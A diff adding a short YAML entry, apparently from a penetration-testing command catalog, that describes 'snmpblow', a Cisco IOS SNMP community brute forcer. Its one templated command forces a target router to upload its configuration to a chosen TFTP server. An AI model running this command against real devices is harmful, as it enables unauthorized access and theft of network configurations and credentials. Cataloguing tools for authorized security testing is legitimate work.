@@ -1,0 +1,15 @@
+---
+name: snmpblow
+description: A blind Cisco IOS SNMP RW community brute forcer
+os: Linux
+ptf_module: null
+---
+commands:
+  - "Force Remote Cisco IOS Device to Upload Config File via TFTP (SNMP Bruteforce)":
+    - type: ["bash","autonomous"]
+    - text: "snmpblow.pl -s {IPV4} -d {IPV4} -t {IPV4} -f {FILE} < {FILE}"
+    - input: ["source IPv4 address","target IPv4 address","TFTP server IPv4 address","desired config file name","SNMP community wordlist file"]
+    - output: ["STDOUT",{"FILE":{"input":4}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
